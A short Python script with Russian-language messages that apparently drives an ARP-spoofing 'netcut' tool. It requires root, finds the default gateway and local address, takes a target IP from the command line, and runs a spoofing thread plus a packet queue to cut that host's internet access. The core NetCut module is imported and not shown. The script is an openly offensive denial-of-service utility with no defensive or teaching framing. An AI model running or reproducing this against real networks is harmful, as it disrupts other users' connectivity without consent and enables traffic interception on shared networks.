import os

if "SUDO_COMMAND" not in os.environ.keys():
    print("Данная программа треубет прав супер пользователя")
    exit()


from threading import Thread
import sys
import netifaces

from net_cut import NetCut


gws = netifaces.gateways()

route_ip = gws["default"][2][0]
active_interface = gws["default"][2][1]
local_ip = netifaces.ifaddresses(active_interface)[2][0]['addr']


nct = NetCut(local_ip, sys.argv[1], route_ip)

print("[*] Начинаю спуфить")
Thread(target=nct.spoof).start()

print("[*] Отключаю интернет")
nct.queue_run()